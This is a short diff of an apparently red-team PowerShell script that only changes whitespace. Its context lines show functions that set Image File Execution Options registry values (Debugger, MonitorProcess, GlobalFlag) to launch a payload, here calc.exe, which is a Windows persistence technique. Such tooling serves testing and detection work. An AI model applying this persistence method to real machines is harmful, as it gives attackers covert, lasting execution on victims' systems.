@@ -28,7 +28,7 @@ function Persist-Debugger
 	$GetIFEO = Get-Item -Path "$GetRegKey"
 
 	$Payload = 'calc.exe'
-	
+
 	$GetIFEO | Set-ItemProperty -Name Debugger -Value $Payload
 }
 }
@@ -59,7 +59,7 @@ function Persist-GlobalFlags
     $GetIF = Get-Item -Path "$GetReg"
 
 	$Payload = 'C:\Windows\System32\calc.exe'
-	
+
 	$GetIFEO | New-ItemProperty -Name MonitorProcess -Value $Payload
     $GetIFEO | New-ItemProperty -Name ReportingMode -Value 1 -PropertyType "DWORD"
     $GetIF | New-ItemProperty -Name GlobalFlag -Value 512 -PropertyType "DWORD"
